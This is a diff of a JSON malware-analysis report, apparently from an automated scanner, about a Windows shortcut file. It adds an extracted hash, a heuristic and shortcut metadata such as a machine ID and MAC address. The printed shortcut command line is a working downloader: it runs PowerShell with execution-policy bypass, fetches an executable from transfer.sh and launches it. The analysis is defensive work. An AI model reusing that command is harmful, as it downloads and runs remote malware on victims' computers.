@@ -3,11 +3,14 @@
         "supplementary": [
             "25841ded09c840ca54070584a6fd6c928265a5e0f5696eb135f8d67b5b804873"
         ],
-        "extracted": []
+        "extracted": [
+            "95c8a613569308bcecd0ffc000f80cdde921aca5ca2ba522803c399bdad428ad"
+        ]
     },
     "result": {
         "heuristics": [
-            1
+            1,
+            5
         ],
         "tags": {
             "file.date.creation": [
@@ -16,14 +19,20 @@
             "file.date.last_modified": [
                 "2021:02:23 13:01:44+00:00"
             ],
-            "file.name.extracted": [
-                "cmd.exe"
-            ],
             "file.shortcut.icon_location": [
                 "%windir%\\system32\\imageres.dll"
             ],
+            "file.shortcut.machine_id": [
+                "desktop-vsfqmp4"
+            ],
+            "file.shortcut.tracker_mac": [
+                "90:1B:0E:14:5D:09"
+            ],
             "file.shortcut.command_line": [
                 "..\\..\\..\\..\\..\\Windows\\System32\\cmd.exe /c  timeout /t 1 /nobreak && powershell -exec bypass \"Invoke-WebRequest -OutFile videoplayer.exe -Uri https://transfer.sh/YfSNTb/video000.exe\" && timeout /t 1 /nobreak & start /b videoplayer.exe"
+            ],
+            "file.name.extracted": [
+                "cmd.exe"
             ]
         }
     }
